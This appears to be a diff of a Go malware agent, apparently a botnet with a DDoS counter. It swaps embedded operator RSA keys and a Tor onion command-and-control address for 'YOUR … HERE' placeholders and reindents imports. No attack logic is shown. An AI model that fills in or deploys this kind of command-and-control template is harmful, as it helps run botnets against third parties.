@@ -19,16 +19,16 @@ import (
 	"crypto"
 	"crypto/tls"
 	"crypto/aes"
-    "crypto/cipher"
-    "crypto/rand"
+        "crypto/cipher"
+        "crypto/rand"
 	"crypto/rsa"
 	rdmod "math/rand"
     // "crypto/sha256"
-    "crypto/sha512"
+        "crypto/sha512"
 	"crypto/x509"
 	"encoding/hex"
-    "encoding/pem"
-    "encoding/base64"
+        "encoding/pem"
+        "encoding/base64"
 	"encoding/json"
 	"unicode"
 	"strings"
@@ -58,35 +58,11 @@ const (
 	osName = 1 // 1 = Windows; 2 = Linux; 3 = Else;
 	ddosCounter = 60
 
-	raw_OPEncryptionKeyPEM = `-----BEGIN RSA PUBLIC KEY-----
-MIICCgKCAgEA3Z0Yd7jcxbE5IDDq95QgGhVGau63x2rqA1eIcmeyV40Yrjm7Qm58
-YBjb2KcGdHYwX0osCmY6xawTe+lfYB4q0thJkOJBXkehsJY6IsysTUxAvGfd808J
-6CgNepgvhNGWahacv/9KdFejKSIJN0enorciz7PIEUuPwfwTy1HTBHZEWjhoFENs
-AYNAq1e2k+p/BclqXikA604y2oErgeiC3p+Yc1n9wVcI0ra6TeZzF/PKgwW6O17f
-Y+sU0IAmjNqkxc8GBNrwt6ULs9e2WfvHCoqCRsln4fQAOq6bK14mLsBXb/piR4Pk
-IFRTRlAAvMFzj4sxoWANUv/TjOz4ZO2LQARjCnyWfmF3gOnkLV+jfyVjhAIF7FBS
-hD8XZkC4EAMoXg1CgSUeilnSd2BrjeoCzT7LRf7XoKGJQ5nOxxsngZHDceXGonci
-057eXfNNUsMENJ2WyRypa3c1wjy/gnabcPn2Nl1O9lHqeflLsdGK5zKmo4xifc6E
-wjnAoTUqBeIL7Gapg1QPmGmAwqaday+PPCz9/PA13D5W2caSrFIu+DZkxrMuaoNM
-6OkOxkh7IEyXyd3tP0WAqPELnFBE31TaFav2smYukX3JL7/GkPPUEluPqKQ/xdAn
-xEab5GfPhyWSFQK1/W7tDLv09G8UcQrdBEeV6d0NcApRS8kIqTRtekECAwEAAQ==
------END RSA PUBLIC KEY-----`
+	raw_OPEncryptionKeyPEM = `YOUR RSA KEY HERE`
 
-	raw_OPSigningKeyPEM = `-----BEGIN RSA PUBLIC KEY-----
-MIICCgKCAgEA3Z0Yd7jcxbE5IDDq95QgGhVGau63x2rqA1eIcmeyV40Yrjm7Qm58
-YBjb2KcGdHYwX0osCmY6xawTe+lfYB4q0thJkOJBXkehsJY6IsysTUxAvGfd808J
-6CgNepgvhNGWahacv/9KdFejKSIJN0enorciz7PIEUuPwfwTy1HTBHZEWjhoFENs
-AYNAq1e2k+p/BclqXikA604y2oErgeiC3p+Yc1n9wVcI0ra6TeZzF/PKgwW6O17f
-Y+sU0IAmjNqkxc8GBNrwt6ULs9e2WfvHCoqCRsln4fQAOq6bK14mLsBXb/piR4Pk
-IFRTRlAAvMFzj4sxoWANUv/TjOz4ZO2LQARjCnyWfmF3gOnkLV+jfyVjhAIF7FBS
-hD8XZkC4EAMoXg1CgSUeilnSd2BrjeoCzT7LRf7XoKGJQ5nOxxsngZHDceXGonci
-057eXfNNUsMENJ2WyRypa3c1wjy/gnabcPn2Nl1O9lHqeflLsdGK5zKmo4xifc6E
-wjnAoTUqBeIL7Gapg1QPmGmAwqaday+PPCz9/PA13D5W2caSrFIu+DZkxrMuaoNM
-6OkOxkh7IEyXyd3tP0WAqPELnFBE31TaFav2smYukX3JL7/GkPPUEluPqKQ/xdAn
-xEab5GfPhyWSFQK1/W7tDLv09G8UcQrdBEeV6d0NcApRS8kIqTRtekECAwEAAQ==
------END RSA PUBLIC KEY-----`
+	raw_OPSigningKeyPEM = `YOUR BACKUP RSA KEY HERE`
 
-	agentAddress = "zqo2ev6d5zr2hibbpc2pewlqep6nwu42gthac22ofv5m2j575e7jl2qd"
+	agentAddress = "YOUR TOR ONION ADDRESS HERE"
 )
 var (
 	alphaletters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
